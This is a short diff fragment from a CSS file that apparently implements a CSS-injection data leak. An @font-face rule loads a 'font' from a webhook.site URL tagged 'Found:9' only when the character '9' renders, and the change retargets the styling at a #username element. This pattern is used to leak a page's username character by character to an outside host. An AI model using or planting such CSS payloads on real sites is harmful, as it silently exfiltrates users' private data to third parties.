@@ -314,7 +314,7 @@ body {
 	src:url('https://webhook.site/2da2e1ae-88ce-40b8-97f1-4c28ec907ed0//?Found:9');
 	unicode-range:U+0039;
 }
-.username #username{
+#username{
     font-size: 10px;
     display: inline;
     z-index: 10000;
